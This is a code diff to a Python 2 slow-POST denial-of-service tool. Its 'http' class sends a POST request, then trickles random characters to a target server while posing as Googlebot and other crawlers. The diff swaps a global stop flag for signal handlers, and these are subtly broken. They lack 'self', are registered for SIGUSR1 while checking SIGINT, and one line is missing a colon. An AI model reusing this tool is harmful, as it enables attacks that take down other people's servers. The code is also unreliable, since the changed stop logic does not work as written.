@@ -11,6 +11,7 @@ import os
 import re
 import time
 import sys
+import signal
 import random
 import math
 import getopt
@@ -20,10 +21,8 @@ import terminal
 
 from threading import Thread
 
-global stop_now
 global term
 
-stop_now = False
 term = terminal.TerminalController()
 
 class smtp(Thread):
@@ -38,13 +37,16 @@ class smtp(Thread):
         user_agents = [
          "OperaMail/9.20 (Windows NT 6.0; U; en)",
         ]
+        signal.signal(signal.SIGUSR1, self._handler)
 
+    def _handler(signum, frame):
+        print('Signal handler called with signal', signum)
+        if signum == signal.SIGINT:
+            self.running = False
 
     def _send(self, pause=10):
         raise NotImplementedError
 
-        # global stop_now
-        #
         # self.socks.send("POST / HTTP/1.1\r\n"
         #                 "Host: %s\r\n"
         #                 "User-Agent: %s\r\n"
@@ -56,8 +58,7 @@ class smtp(Thread):
         #
         # # slow post attachment
         # for i in range(0, 9999):
-        #     if stop_now:
-        #         self.running = False
+        #     if self.running is False
         #         break
         #     p = random.choice(string.letters+string.digits)
         #     print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL
@@ -123,10 +124,15 @@ class http(Thread):
          "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
          "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
         ]
+        signal.signal(signal.SIGUSR1, self._handler)
 
+    def _handler(signum, frame):
+        print('Signal handler called with signal', signum)
+        if signum == signal.SIGINT:
+            self.running = False
+            raise KeyboardInterrupt
 
     def _post(self, pause=10):
-        global stop_now
 
         self.socks.send("POST / HTTP/1.1\r\n"
                         "Host: %s\r\n"
@@ -138,8 +144,7 @@ class http(Thread):
                         (self.host, random.choice(self.user_agents)))
 
         for i in range(0, 9999):
-            if stop_now:
-                self.running = False
+            if self.running is False:
                 break
             p = random.choice(string.letters+string.digits)
             print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL
